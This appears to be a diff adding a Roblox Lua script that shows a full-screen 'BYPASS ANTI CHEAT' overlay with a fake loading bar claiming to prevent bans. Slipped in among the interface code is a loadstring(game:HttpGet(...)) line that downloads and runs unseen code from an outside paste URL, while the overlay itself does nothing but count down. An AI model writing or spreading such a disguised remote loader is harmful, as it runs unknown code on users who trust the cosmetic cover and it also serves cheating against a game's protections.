@@ -1,1 +1,83 @@
 
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "ScriptLoadingGui"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 999
+gui.Parent = player:WaitForChild("PlayerGui")
+loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/QAVR4QfHdU1gDwkd/raw'))()
+-- Full-screen overlay
+local overlay = Instance.new("Frame")
+overlay.Size = UDim2.fromScale(1, 1)
+overlay.BackgroundColor3 = Color3.fromRGB(8, 8, 15)
+overlay.BorderSizePixel = 0
+overlay.Parent = gui
+
+-- Main title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(0.9, 0, 0, 100)
+title.Position = UDim2.new(0.05, 0, 0.3, 0)
+title.BackgroundTransparency = 1
+title.Text = "BYPASS ANTI CHEAT"
+title.TextColor3 = Color3.fromRGB(0, 170, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = overlay
+
+-- Description
+local description = Instance.new("TextLabel")
+description.Size = UDim2.new(0.9, 0, 0, 80)
+description.Position = UDim2.new(0.05, 0, 0.43, 0)
+description.BackgroundTransparency = 1
+description.Text = "Loading script to prevent ban..."
+description.TextColor3 = Color3.new(1, 1, 1)
+description.TextScaled = true
+description.Font = Enum.Font.Gotham
+description.Parent = overlay
+
+-- Loading bar background
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0.7, 0, 0, 12)
+barBG.Position = UDim2.new(0.15, 0, 0.58, 0)
+barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+barBG.BorderSizePixel = 0
+barBG.Parent = overlay
+
+Instance.new("UICorner", barBG).CornerRadius =
+    UDim.new(1, 0)
+
+-- Loading bar fill
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+bar.BorderSizePixel = 0
+bar.Parent = barBG
+
+Instance.new("UICorner", bar).CornerRadius =
+    UDim.new(1, 0)
+
+-- Countdown
+local countdown = Instance.new("TextLabel")
+countdown.Size = UDim2.new(1, 0, 0, 40)
+countdown.Position = UDim2.new(0, 0, 0.63, 0)
+countdown.BackgroundTransparency = 1
+countdown.TextColor3 = Color3.new(1, 1, 1)
+countdown.TextScaled = true
+countdown.Font = Enum.Font.GothamBold
+countdown.Parent = overlay
+
+-- Load for 10 seconds
+for i = 1, 100 do
+    bar.Size = UDim2.new(i / 100, 0, 1, 0)
+    countdown.Text = "Loading... " ..
+        math.ceil((100 - i) / 10) .. "s"
+    task.wait(0.1)
+end
+
+countdown.Text = "Loading complete!"
+task.wait(0.5)
+
+gui:Destroy()
